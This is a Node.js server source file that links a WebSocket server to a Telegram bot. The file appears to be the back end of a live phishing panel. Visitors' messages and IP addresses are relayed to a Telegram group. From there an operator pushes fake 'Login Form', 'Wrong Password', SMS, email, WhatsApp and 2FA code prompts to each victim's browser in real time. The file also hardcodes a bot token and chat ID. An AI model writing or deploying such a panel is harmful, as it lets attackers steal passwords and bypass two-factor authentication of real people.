const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(bodyParser.json());

const botToken = '7539675476:AAG3HvyqvP4xapW_k6HG_VlsOTWvjiK5z7M';
const bot = new TelegramBot(botToken, { polling: true });

const clients = new Map();
const messageToUserMap = new Map();

wss.on('connection', (ws, req) => {
  const userId = uuidv4();
  const ip = req.socket.remoteAddress;
  clients.set(userId, ws);
  console.log(`New client connected: ${userId}, IP: ${ip}`);
  ws.send(JSON.stringify({ type: 'welcome', userId, ip }));
  ws.on('close', () => clients.delete(userId));
});

const sendToUser = (userId, data) => {
  const client = clients.get(userId);
  if (client && client.readyState === WebSocket.OPEN) {
    client.send(JSON.stringify(data));
  }
};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Select an action:', {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Login Form', callback_data: 'login-form' }],
        [{ text: 'Wrong Password', callback_data: 'wrongpsw' }],
        [{ text: 'Wait Time', callback_data: 'waitTime' }],
        [{ text: 'Email Code', callback_data: 'codeEmail' }],
        [{ text: 'SMS Code', callback_data: 'codeSms' }],
        [{ text: '2FA Auth', callback_data: 'authcode' }],
        [{ text: 'Whatsapp Code', callback_data: 'whatsappcode' }],
        [{ text: 'Old Password', callback_data: 'oldpass' }]
      ]
    }
  });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const userId = messageToUserMap.get(messageId);
  if (!userId) return;

  const action = query.data;
  sendToUser(userId, { type: 'show_modal', modalId: action });
  bot.answerCallbackQuery(query.id);
});

app.post('/send-message', (req, res) => {
  const { message, userId } = req.body;
  const chatId = '-1002327154709'; // your group/channel/chat ID

  if (!clients.has(userId)) return res.status(404).send({ error: 'User not connected.' });

  bot.sendMessage(chatId, `${message}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Login Form', callback_data: 'login-form' }],
        [{ text: 'Wrong Password', callback_data: 'wrongpsw' }],
        [{ text: 'Wait Time', callback_data: 'waitTime' }],
        [{ text: 'Email Code', callback_data: 'codeEmail' }],
        [{ text: 'SMS Code', callback_data: 'codeSms' }],
        [{ text: '2FA Auth', callback_data: 'authcode' }],
        [{ text: 'Whatsapp Code', callback_data: 'whatsappcode' }],
        [{ text: 'Old Password', callback_data: 'oldpass' }]
      ]
    }
  }).then((sentMessage) => {
    messageToUserMap.set(sentMessage.message_id, userId);
  });

  sendToUser(userId, { type: 'acknowledge', payload: 'Message sent successfully!' });
  res.send({ status: 'Message sent to Telegram!' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
